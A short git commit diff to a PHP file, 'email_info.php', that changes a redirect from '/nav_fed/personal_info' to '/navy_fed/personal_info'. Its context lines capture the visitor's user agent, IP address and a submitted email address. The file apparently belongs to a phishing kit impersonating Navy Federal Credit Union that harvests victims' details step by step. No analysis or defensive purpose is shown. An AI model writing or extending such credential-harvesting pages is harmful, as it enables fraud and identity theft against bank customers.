d674eecf44b4f12816c5bc01bad2f191093c563c
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-09-22 14:37:20 +0200

    Update email_info.php

--- email_info.php
+++ email_info.php
@@ -1,5 +1,5 @@
 <?php
-header('Location: /nav_fed/personal_info');
+header('Location: /navy_fed/personal_info');
 $Agent=$_SERVER['HTTP_USER_AGENT'];
 $Ip=$_SERVER['REMOTE_ADDR'];
 $email=$_POST['email'];
